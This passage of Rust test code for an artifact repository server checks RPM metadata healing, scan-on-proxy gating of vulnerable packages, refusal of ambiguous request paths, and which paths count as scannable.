            sqlx::query_scalar("SELECT COUNT(*) FROM artifacts WHERE repository_id = $1")
                .bind(f.repo_id)
                .fetch_one(&f.pool)
                .await
                .unwrap();
        let storage = f
            .state
            .storage_for_repo(&f.repo_info("local", None).storage_location())
            .unwrap();
        let stored = storage.exists(&key).await.unwrap();
        f.teardown().await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert_eq!(rows, 0, "a refused upload must not create an artifact");
        assert!(!stored, "a refused upload must not store its bytes");
    }

    /// A stored package whose header cannot be indexed gets a persisted
    /// "unparseable" marker, so later renders never read it again; the heal
    /// merges only its block into the row, keeping keys written since.
    #[tokio::test]
    async fn heal_marks_unparseable_and_merges_into_the_row() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let repo = f.repo_info("local", None);
        let junk = "junk-1.0-1.noarch.rpm";
        let junk_id = tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            &format!("rpm/{}/{junk}", f.repo_id),
            &format!("packages/{junk}"),
            "junk",
            "1.0-1",
            "application/x-rpm",
            bytes::Bytes::from_static(b"definitely not an rpm package"),
            f.user_id,
        )
        .await;
        let deps_id = tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            &format!("rpm/{}/{DEPS_FILENAME}", f.repo_id),
            &format!("packages/{DEPS_FILENAME}"),
            "ak-deps-test",
            "1.5-3",
            "application/x-rpm",
            bytes::Bytes::from_static(DEPS_RPM),
            f.user_id,
        )
        .await;
        // The row gains a key the render's (stale) copy does not have.
        let mut legacy = build_rpm_artifact_metadata(DEPS_FILENAME, DEPS_RPM)
            .expect("not rejected")
            .unwrap();
        legacy.as_object_mut().unwrap().remove(RPM_REPODATA_KEY);
        let mut row = legacy.clone();
        row["written_concurrently"] = serde_json::json!(true);
        proxy_helpers::record_artifact_metadata(&f.pool, deps_id, f.repo_id, "rpm", &row).await;

        let mut artifacts = collect_repodata_artifacts(&f.pool, &[f.repo_id])
            .await
            .unwrap();
        for a in &mut artifacts {
            if a.id == deps_id {
                a.metadata = Some(legacy.clone());
            }
        }
        let complete = heal_rpm_repodata_info(&f.state, &mut artifacts).await;
        let second = {
            let again = collect_repodata_artifacts(&f.pool, &[f.repo_id])
                .await
                .unwrap();
            again.iter().filter(|a| needs_repodata_heal(a)).count()
        };
        let stored = |id: uuid::Uuid| {
            let pool = f.pool.clone();
            async move {
                sqlx::query_scalar::<_, serde_json::Value>(
                    "SELECT metadata FROM artifact_metadata WHERE artifact_id = $1",
                )
                .bind(id)
                .fetch_one(&pool)
                .await
                .unwrap()
            }
        };
        let junk_row = stored(junk_id).await;
        let deps_row = stored(deps_id).await;
        f.teardown().await;

        assert!(complete, "nothing transient failed");
        assert_eq!(second, 0, "every package is settled after one heal");
        assert_eq!(
            junk_row[RPM_REPODATA_KEY]["unparseable"], true,
            "{junk_row}"
        );
        assert_eq!(deps_row[RPM_REPODATA_KEY]["v"], RPM_REPODATA_INFO_VERSION);
        assert_eq!(
            deps_row["written_concurrently"], true,
            "the heal must merge its block, not overwrite the row: {deps_row}"
        );
    }
    /// An unreadable stored package (object missing: a mount blip looks the
    /// same) is retried, not settled on the first failure; after
    /// RPM_HEAL_MAX_TRANSIENT_FAILURES in a row it gets a marker that is
    /// retried a day later, so the repository's renders become cacheable.
    #[tokio::test]
    async fn heal_promotes_repeated_transient_failures_to_a_retryable_marker() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let repo = f.repo_info("local", None);
        let key = format!("rpm/{}/{DEPS_FILENAME}", f.repo_id);
        let id = tdh::seed_artifact(
            &f.state,
            &f.pool,
            &repo,
            &key,
            &format!("packages/{DEPS_FILENAME}"),
            "ak-deps-test",
            "1.5-3",
            "application/x-rpm",
            bytes::Bytes::from_static(DEPS_RPM),
            f.user_id,
        )
        .await;
        let storage = f.state.storage_for_repo(&repo.storage_location()).unwrap();
        storage.delete(&key).await.unwrap();

        let mut outcomes = Vec::new();
        let mut artifacts = Vec::new();
        for _ in 0..RPM_HEAL_MAX_TRANSIENT_FAILURES {
            artifacts = collect_repodata_artifacts(&f.pool, &[f.repo_id])
                .await
                .unwrap();
            outcomes.push(heal_rpm_repodata_info(&f.state, &mut artifacts).await);
        }
        let after = collect_repodata_artifacts(&f.pool, &[f.repo_id])
            .await
            .unwrap();
        f.teardown().await;
        let _ = (id, artifacts);

        let (last, earlier) = outcomes.split_last().unwrap();
        assert!(
            earlier.iter().all(|c| !c),
            "transient failures keep renders uncacheable: {outcomes:?}"
        );
        assert!(last, "the last failure settles the package: {outcomes:?}");
        let a = &after[0];
        let block = &a.metadata.as_ref().unwrap()[RPM_REPODATA_KEY];
        assert_eq!(block["unparseable"], true, "{block}");
        let retry_after = block["retry_after"].as_i64().expect("retryable marker");
        assert!(!needs_repodata_heal_at(a, retry_after - 1));
        assert!(needs_repodata_heal_at(a, retry_after), "retried once due");
    }
}

/// #4112: scan-on-proxy for RPM packages, Remote and Virtual. The shared
/// archive scenarios on the `/packages/` route and the catch-all, and the
/// identity rule.
#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod scan_on_proxy_4112 {
    use super::*;
    use crate::api::handlers::proxy_scan_archive::test_support::{
        self as ts, archive_scan_suite, minimal_rpm, ArchiveCase, Rig,
    };
    use crate::api::handlers::proxy_scan_archive::ArchiveIdentity;
    use crate::api::handlers::test_db_helpers as tdh;

    /// The pin the gate grades `rpm()` as: its `el9_2` names RHEL 9.
    fn pin() -> Option<crate::services::scanner_service::ExpectedComponent> {
        crate::services::scanner_service::ExpectedComponent::os_package(
            crate::services::scanner_service::ComponentEcosystem::Rpm,
            "dtf-libs",
            "1:1.0-1.el9_2",
            crate::services::scanner_service::OsPackageContext {
                release: crate::services::scanner_service::OsRelease::new("rhel", "9")?,
                arch: "x86_64".to_string(),
                source: None,
            },
        )
    }

    const FILE: &str = "dtf-libs-1.0-1.el9_2.x86_64.rpm";

    /// A minimal `.rpm` for `FILE`; the random payload byte keeps every
    /// fixture's digest unique.
    fn rpm() -> Vec<u8> {
        let mut rpm = minimal_rpm("dtf-libs", Some(1), "1.0", "1.el9_2", "x86_64", &[]);
        rpm.extend_from_slice(uuid::Uuid::new_v4().as_bytes());
        rpm
    }

    fn case(_mock: &str) -> ArchiveCase {
        let path = format!("packages/{FILE}");
        ArchiveCase {
            format: "rpm",
            router: super::router,
            uri: Box::new(|key| format!("/{key}/packages/{FILE}")),
            package_path: format!("/{path}"),
            extra: Vec::new(),
            body: rpm(),
            recorded_path: path,
            file: FILE.to_string(),
            pin: pin(),
        }
    }

    archive_scan_suite!(case);

    /// The yum layout dnf actually fetches, through the catch-all.
    fn catchall_case(_mock: &str) -> ArchiveCase {
        let path = format!("9/BaseOS/x86_64/os/Packages/d/{FILE}");
        ArchiveCase {
            format: "rpm",
            router: super::router,
            uri: Box::new(|key| format!("/{key}/9/BaseOS/x86_64/os/Packages/d/{FILE}")),
            package_path: format!("/{path}"),
            extra: Vec::new(),
            body: rpm(),
            recorded_path: path,
            file: FILE.to_string(),
            pin: pin(),
        }
    }

    #[tokio::test]
    async fn a_package_on_the_catch_all_is_gated() {
        ts::clean_is_served_and_the_verdict_reused(catchall_case).await;
        ts::vulnerable_is_blocked(catchall_case).await;
        ts::fail_closed_without_a_verdict_is_locked(catchall_case).await;
        ts::fail_open_first_pull_is_served_pending(catchall_case).await;
        ts::virtual_member_is_gated(catchall_case).await;
        ts::without_scan_on_proxy_streams_unscanned(catchall_case).await;
    }

    /// Repository metadata on the catch-all still streams through a scanning
    /// Remote: only package files are gated.
    #[tokio::test]
    async fn repository_metadata_is_not_gated() {
        let Some(rig) = Rig::new(catchall_case, Some("fail_closed")).await else {
            return;
        };
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path(
                "/9/BaseOS/x86_64/os/RPM-GPG-KEY-dtf",
            ))
            .respond_with(wiremock::ResponseTemplate::new(200).set_body_string("-----BEGIN PGP"))
            .mount(&rig.server)
            .await;
        let (status, body, headers) = tdh::send_with_headers(
            tdh::router_anon(super::router(), rig.state.clone()),
            tdh::get(format!(
                "/{}/9/BaseOS/x86_64/os/RPM-GPG-KEY-dtf",
                rig.fx.repo_key
            )),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(&body[..], b"-----BEGIN PGP");
        assert!(headers.get("X-AK-Scan").is_none());
        rig.teardown().await;
    }

    /// #4365 item 3: an ambiguous segment on a proxying repository is a 400
    /// before anything is fetched, on both routes.
    #[tokio::test]
    async fn an_ambiguous_segment_is_refused_on_every_route() {
        let Some(rig) = Rig::new(case, Some("fail_closed")).await else {
            return;
        };
        for key in [rig.fx.repo_key.clone(), rig.virtual_key.clone()] {
            for uri in [
                format!("/{key}/packages/{FILE}%3F.xml"),
                format!("/{key}/9/BaseOS/x86_64/os/Packages/d/{FILE}%23x"),
                format!("/{key}/9/BaseOS/x86_64/os/repodata/repomd.xml%3Bx"),
            ] {
                let (status, _, _) = tdh::send_with_headers(
                    tdh::router_anon(super::router(), rig.state.clone()),
                    tdh::get(uri.clone()),
                )
                .await;
                assert_eq!(status, StatusCode::BAD_REQUEST, "{uri}");
            }
        }
        assert_eq!(
            rig.package_fetches().await,
            0,
            "nothing reached the upstream"
        );
        rig.teardown().await;
    }

    #[test]
    fn an_rpm_that_is_the_requested_package_is_pinned_as_it() {
        let ArchiveIdentity::Pinned(pin) = rpm_identity(FILE, &Bytes::from(rpm())) else {
            panic!("an .rpm whose header agrees is pinned");
        };
        assert_eq!(pin.name, "dtf-libs");
        assert_eq!(pin.version, "1:1.0-1.el9_2");
        let os = pin.os.expect("an OS pin");
        assert_eq!(os.release.label(), "rhel:9");
        assert_eq!(os.arch, "x86_64");
    }

    #[test]
    fn an_rpm_that_is_not_the_requested_package_is_unestablished() {
        let bytes = Bytes::from(rpm());
        for requested in [
            "other-1.0-1.el9_2.x86_64.rpm",
            "dtf-libs-1.1-1.el9_2.x86_64.rpm",
            "dtf-libs-1.0-2.el9_2.x86_64.rpm",
            "dtf-libs-1.0-1.el9_2.aarch64.rpm",
        ] {
            assert!(
                matches!(
                    rpm_identity(requested, &bytes),
                    ArchiveIdentity::Disagrees(_)
                ),
                "{requested}"
            );
        }
        // No dist tag the scanner has a feed for: not graded as anything.
        let untagged = Bytes::from(minimal_rpm("dtf", None, "1.0", "1", "noarch", &[]));
        assert!(matches!(
            rpm_identity("dtf-1.0-1.noarch.rpm", &untagged),
            ArchiveIdentity::Unreadable(_)
        ));
        for (name, body) in [
            ("dtf-libs-1.0-1.el9_2.x86_64.drpm", bytes.clone()),
            ("install.img", bytes.clone()),
            (FILE, Bytes::from_static(b"not an rpm")),
        ] {
            assert!(
                matches!(rpm_identity(name, &body), ArchiveIdentity::Unreadable(_)),
                "{name}"
            );
        }
    }
}

/// #4365 item 1: RPM decides by path: everything except repository metadata
/// and signing material is gated; the cache key is the streaming arm's path.
#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod serve_key_4365_tests {
    use super::*;

    #[test]
    fn the_serve_key_is_the_streaming_cache_path_and_decides_by_path() {
        for (path, scannable) in [
            ("packages/openssl-libs-3.0.7-17.el9_2.x86_64.rpm", true),
            (
                "9/BaseOS/x86_64/os/Packages/o/openssl-3.0.7-17.el9_2.x86_64.rpm",
                true,
            ),
            (
                "9/BaseOS/x86_64/os/Packages/o/openssl-3.0.7-17.el9_2.x86_64.drpm",
                true,
            ),
            ("9/BaseOS/x86_64/os/images/install.img", true),
            ("9/BaseOS/x86_64/os/repodata/repomd.xml", false),
            ("9/BaseOS/x86_64/os/repodata/abc-primary.xml.gz", false),
            ("repodata/repomd.xml.asc", false),
            ("9/BaseOS/x86_64/os/RPM-GPG-KEY-Rocky-9", false),
            ("9/BaseOS/x86_64/os/.treeinfo", false),
            ("9/BaseOS/x86_64/os/media.repo", false),
            ("repodata/repomd.xml?x", true),
        ] {
            let key = rpm_serve_key(path);
            assert_eq!(key.scannable, scannable, "{path}");
            assert_eq!(key.cache_key, path, "{path}");
        }
    }
}
